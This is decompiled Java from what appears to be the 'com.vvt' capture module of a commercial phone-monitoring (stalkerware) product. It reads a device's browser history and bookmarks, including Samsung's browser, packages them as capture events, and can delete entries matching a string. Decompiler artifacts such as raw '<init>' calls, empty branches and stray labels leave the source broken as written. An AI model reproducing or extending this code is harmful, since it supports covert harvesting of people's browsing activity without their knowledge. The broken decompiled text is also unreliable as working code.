package com.vvt.capture.browserurl.b;

import android.content.ContentResolver;
import android.net.Uri;
import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.browserurl.BrowserUrlData;
import com.vvt.capture.browserurl.BrowserUrlData.UrlType;
import com.vvt.d.d;
import com.vvt.d.e;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class c
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private ContentResolver c;
  
  public c(ContentResolver paramContentResolver)
  {
    this.c = paramContentResolver;
  }
  
  private BrowserUrlData a(e parame)
  {
    BrowserUrlData localBrowserUrlData = new com/vvt/capture/browserurl/BrowserUrlData;
    localBrowserUrlData.<init>();
    long l = parame.a();
    localBrowserUrlData.a(l);
    l = System.currentTimeMillis();
    localBrowserUrlData.b(l);
    Object localObject = parame.d();
    localBrowserUrlData.a((String)localObject);
    l = parame.b();
    localBrowserUrlData.c(l);
    boolean bool = parame.c();
    if (bool) {}
    for (localObject = BrowserUrlData.UrlType.BOOKMARKS;; localObject = BrowserUrlData.UrlType.HISTORY)
    {
      localBrowserUrlData.a((BrowserUrlData.UrlType)localObject);
      localObject = parame.e();
      localBrowserUrlData.b((String)localObject);
      return localBrowserUrlData;
    }
  }
  
  public g a()
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = this.c;
    boolean bool2 = false;
    localObject = d.a((ContentResolver)localObject, 0);
    ContentResolver localContentResolver = this.c;
    localObject = d.a((Uri)localObject, localContentResolver);
    if (localObject != null)
    {
      bool2 = a;
      if (!bool2) {}
    }
    for (long l = ((e)localObject).b();; l = -1)
    {
      FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
      localFxSimpleEventReference.<init>();
      localObject = Long.valueOf(l);
      localFxSimpleEventReference.setReference((Long)localObject);
      bool1 = a;
      if (bool1) {}
      return localFxSimpleEventReference;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = d.a(this.c, 0);
    Object localObject2 = this.c;
    localObject1 = d.a(paramInt, (Uri)localObject1, (ContentResolver)localObject2);
    localObject2 = new java/util/ArrayList;
    ((ArrayList)localObject2).<init>();
    Iterator localIterator = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (e)localIterator.next();
      localObject1 = a((e)localObject1);
      ((List)localObject2).add(localObject1);
    }
    if (localObject2 != null)
    {
      int i = ((List)localObject2).size();
      if (i > 0)
      {
        bool2 = a;
        if (bool2) {}
        localArrayList.addAll((Collection)localObject2);
      }
    }
    boolean bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool2 = paramg1 instanceof FxSimpleEventReference;
    if (bool2)
    {
      bool2 = paramg2 instanceof FxSimpleEventReference;
      if (bool2)
      {
        Object localObject1 = d.a(this.c, 0);
        Object localObject2 = this.c;
        localObject1 = d.a((Uri)localObject1, (ContentResolver)localObject2);
        localObject2 = new java/util/ArrayList;
        ((ArrayList)localObject2).<init>();
        localObject1 = a((e)localObject1);
        ((List)localObject2).add(localObject1);
        if (localObject2 != null)
        {
          int i = ((List)localObject2).size();
          if (i > 0)
          {
            bool3 = a;
            if (bool3) {}
            localArrayList.addAll((Collection)localObject2);
          }
        }
      }
    }
    boolean bool3 = a;
    if (bool3) {}
    return localArrayList;
  }
  
  public boolean a(BrowserUrlData.UrlType paramUrlType, String paramString)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    for (;;)
    {
      Uri localUri;
      long l1;
      Object localObject3;
      try
      {
        localObject1 = new java/util/ArrayList;
        ((ArrayList)localObject1).<init>();
        Object localObject2 = BrowserUrlData.UrlType.BOOKMARKS;
        if (paramUrlType == localObject2)
        {
          int j = i;
          localObject2 = this.c;
          localUri = d.a((ContentResolver)localObject2, j);
          localObject2 = localUri.toString();
          localObject2 = ((String)localObject2).toLowerCase();
          str1 = "sbrowser";
          bool1 = ((String)localObject2).contains(str1);
          if (!bool1) {
            break label360;
          }
          bool2 = i;
          localObject2 = this.c;
          l1 = 0L;
          localObject2 = d.a(localUri, (ContentResolver)localObject2, l1, j);
          Iterator localIterator = ((List)localObject2).iterator();
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break label255;
          }
          localObject2 = localIterator.next();
          localObject2 = (e)localObject2;
          String str2 = ((e)localObject2).e();
          if (str2 == null) {
            continue;
          }
          str2 = ((e)localObject2).e();
          str2 = str2.toLowerCase();
          String str3 = paramString.toLowerCase();
          boolean bool3 = str2.contains(str3);
          if (!bool3) {
            continue;
          }
          long l2 = ((e)localObject2).a();
          localObject2 = Long.valueOf(l2);
          ((List)localObject1).add(localObject2);
          continue;
        }
        k = 0;
      }
      catch (Exception localException)
      {
        bool1 = b;
        if (bool1) {}
        bool1 = false;
        localObject3 = null;
        i = a;
        if (i != 0) {}
        return bool1;
      }
      int k;
      continue;
      label255:
      Object localObject1 = ((List)localObject1).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject1).hasNext();
        if (!bool1) {
          break;
        }
        localObject3 = ((Iterator)localObject1).next();
        localObject3 = (Long)localObject3;
        l1 = ((Long)localObject3).longValue();
        bool1 = a;
        if ((!bool1) || (bool2))
        {
          localObject3 = this.c;
          d.b(localUri, (ContentResolver)localObject3, l1, k);
        }
        else
        {
          localObject3 = this.c;
          d.b(localUri, (ContentResolver)localObject3, l1);
        }
      }
      bool1 = i;
      continue;
      label360:
      boolean bool2 = false;
      String str1 = null;
    }
  }
  
  public List b()
  {
    long l1 = 0L;
    int i = 1;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = d.a(this.c, i);
    Object localObject2 = ((Uri)localObject1).toString().toLowerCase();
    Object localObject3 = "sbrowser";
    boolean bool1 = ((String)localObject2).contains((CharSequence)localObject3);
    if (bool1) {
      localObject2 = this.c;
    }
    for (localObject1 = d.a((Uri)localObject1, (ContentResolver)localObject2, l1);; localObject1 = d.a((Uri)localObject1, (ContentResolver)localObject2, l1, i))
    {
      localObject2 = new java/text/SimpleDateFormat;
      ((SimpleDateFormat)localObject2).<init>("dd/MM/yy HH:mm:ss");
      localObject3 = ((List)localObject1).iterator();
      for (;;)
      {
        boolean bool2 = ((Iterator)localObject3).hasNext();
        if (!bool2) {
          break;
        }
        localObject1 = (e)((Iterator)localObject3).next();
        BrowserUrlData localBrowserUrlData = new com/vvt/capture/browserurl/BrowserUrlData;
        localBrowserUrlData.<init>();
        l1 = ((e)localObject1).a();
        localBrowserUrlData.a(l1);
        l1 = ((e)localObject1).b();
        localBrowserUrlData.b(l1);
        Object localObject4 = new java/sql/Date;
        long l2 = ((e)localObject1).b();
        ((java.sql.Date)localObject4).<init>(l2);
        localObject4 = ((SimpleDateFormat)localObject2).format((java.util.Date)localObject4);
        localBrowserUrlData.c((String)localObject4);
        localObject4 = ((e)localObject1).d();
        localBrowserUrlData.a((String)localObject4);
        localObject4 = BrowserUrlData.UrlType.BOOKMARKS;
        localBrowserUrlData.a((BrowserUrlData.UrlType)localObject4);
        localObject4 = ((e)localObject1).e();
        localBrowserUrlData.b((String)localObject4);
        l1 = ((e)localObject1).b();
        localBrowserUrlData.c(l1);
        localArrayList.add(localBrowserUrlData);
      }
      localObject2 = this.c;
    }
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/browserurl/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */